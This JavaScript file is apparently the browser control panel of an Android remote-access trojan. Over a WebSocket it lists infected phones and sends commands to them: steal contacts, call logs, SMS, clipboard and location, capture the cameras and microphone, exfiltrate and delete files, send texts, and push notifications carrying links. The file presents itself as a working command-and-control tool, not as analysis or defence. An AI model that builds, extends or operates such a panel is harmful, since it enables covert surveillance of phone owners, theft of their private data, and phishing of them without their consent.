document.addEventListener('DOMContentLoaded', () => {
    // --- Element References ---
    const statusDiv = document.getElementById('connection-status');
    const statusText = statusDiv.querySelector('span').nextSibling;
    const deviceListDiv = document.getElementById('device-list');
    const deviceCountSpan = document.getElementById('device-count');
    const logOutputDiv = document.getElementById('log-output');
    const modal = document.getElementById('command-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const closeModalButton = modal.querySelector('.close-button');

    let socket;
    let selectedUuid = null;

    // --- Command Definitions ---
    const commands = [
        { name: 'Apps', command: 'apps' },
        { name: 'Device Info', command: 'device_info' },
        { name: 'Clipboard', command: 'clipboard' },
        { name: 'Main Camera', command: 'camera_main' },
        { name: 'Selfie Camera', command: 'camera_selfie' },
        { name: 'Location', command: 'location' },
        { name: 'Calls', command: 'calls' },
        { name: 'Contacts', command: 'contacts' },
        { name: 'Vibrate', command: 'vibrate' },
        { name: 'Messages', command: 'messages' },
        { name: 'Stop Audio', command: 'stop_audio' },
        { name: 'Get File', command: 'file', input: 'Enter file path (e.g., DCIM/Camera)' },
        { name: 'Delete File', command: 'delete_file', input: 'Enter file path to delete' },
        { name: 'Microphone', command: 'microphone', input: 'Enter recording duration in seconds' },
        { name: 'Toast', command: 'toast', input: 'Enter toast message' },
        { name: 'Show Notification', command: 'show_notification', input: 'Enter title/link (e.g., New Message/https://google.com)' },
        { name: 'Send Message', command: 'send_message', input: 'Enter number/message' },
        { name: 'Play Audio', command: 'play_audio', input: 'Enter direct audio URL' },
    ];

    /**
     * Connects to the WebSocket server.
     */
    function connect() {
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        socket = new WebSocket(`${wsProtocol}//${window.location.host}/panel`);

        socket.onopen = () => {
            statusDiv.className = 'status-connected';
            statusText.textContent = ' ONLINE';
            addLog('✅ Connected to server.', 'system');
        };

        socket.onclose = () => {
            statusDiv.className = 'status-disconnected';
            statusText.textContent = ' OFFLINE';
            addLog('❌ Connection lost. Reconnecting in 5 seconds...', 'error');
            setTimeout(connect, 5000);
        };

        socket.onerror = (error) => {
            console.error('WebSocket Error:', error);
            addLog('A connection error occurred.', 'error');
        };

        socket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleServerMessage(data);
        };
    }

    /**
     * Handles incoming messages from the server.
     */
    function handleServerMessage({ type, payload }) {
        switch (type) {
            case 'initial_device_list':
                deviceListDiv.innerHTML = '';
                payload.forEach(renderDevice);
                updateDeviceCount();
                break;
            case 'device_connected':
                addLog(`📱 New device connected: ${payload.model}`, 'system');
                renderDevice(payload);
                updateDeviceCount();
                break;
            case 'device_disconnected':
                const card = document.getElementById(payload.uuid);
                if (card) {
                    addLog(`🔌 Device disconnected: ${card.querySelector('h4').textContent}`, 'error');
                    card.remove();
                    updateDeviceCount();
                }
                break;
            case 'text_received':
                addLog(`📋 Clipboard/Text: <pre>${payload.text}</pre>`, 'info', payload.deviceName);
                break;
            case 'location_received':
                addLog(`📍 Location: <a href="https://www.google.com/maps?q=${payload.lat},${payload.lon}" target="_blank">View on Map</a>`, 'info', payload.deviceName);
                break;
            // --- ENHANCED: File handling case ---
            case 'file_received':
                addLog(`📁 File Received: <a href="${payload.downloadPath}" target="_blank" download="${payload.filename}">${payload.filename}</a>`, 'info', payload.deviceName);
                break;
            case 'device_log':
                addLog(payload.message, 'info', payload.deviceName);
                break;
        }
    }
    
    /**
     * Renders a device card in the UI.
     */
    function renderDevice(device) {
        let card = document.getElementById(device.uuid);
        if (!card) {
            card = document.createElement('div');
            card.id = device.uuid;
            card.className = 'device-card';
            card.addEventListener('click', () => openCommandModal(device));
            deviceListDiv.appendChild(card);
        }
        card.innerHTML = `
            <h4>${device.model}</h4>
            <div class="device-info">
                <p><strong>Battery:</strong> ${device.battery}%</p>
                <p><strong>Android:</strong> ${device.version}</p>
                <p><strong>Provider:</strong> ${device.provider}</p>
                <p><strong>UUID:</strong> ${device.uuid}</p>
            </div>
        `;
    }

    /**
     * Displays the command modal.
     */
    function openCommandModal(device) {
        selectedUuid = device.uuid;
        modalTitle.textContent = `Commands for ${device.model}`;
        modalBody.innerHTML = '';

        commands.forEach(cmd => {
            const button = document.createElement('button');
            button.className = 'command-button';
            button.textContent = cmd.name;
            // --- ENHANCED: Use prompt for input ---
            button.onclick = () => {
                // If the command needs input, show a prompt pop-up
                if (cmd.input) {
                    const parameter = prompt(cmd.input);
                    // Only send command if user entered something and didn't cancel
                    if (parameter && parameter.trim() !== "") {
                        sendCommand(cmd.command, parameter);
                        modal.style.display = 'none';
                    }
                } else {
                    // Otherwise, send the command directly
                    sendCommand(cmd.command);
                    modal.style.display = 'none';
                }
            };
            modalBody.appendChild(button);
        });
        
        modal.style.display = 'flex';
    }

    /**
     * Sends a command to the server.
     */
    function sendCommand(command, parameter = null) {
        let fullCommand = command;
        if (parameter) {
            fullCommand += `:${parameter}`;
        }
        socket.send(JSON.stringify({
            type: 'command',
            payload: { uuid: selectedUuid, command: fullCommand }
        }));
        addLog(`🚀 Sending command '${fullCommand}'`, 'system');
    }

    // --- UI Helpers ---
    function addLog(message, type = 'info', deviceName = '') {
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        const timestamp = new Date().toLocaleTimeString();
        let finalMessage = `[${timestamp}] `;
        if (deviceName) finalMessage += `<strong>${deviceName}:</strong> `;
        finalMessage += message;
        entry.innerHTML = finalMessage;
        logOutputDiv.appendChild(entry);
        logOutputDiv.scrollTop = logOutputDiv.scrollHeight;
    }

    function updateDeviceCount() {
        deviceCountSpan.textContent = deviceListDiv.children.length;
    }

    // --- Event Listeners ---
    closeModalButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    // --- Initial Kickoff ---
    connect();
});

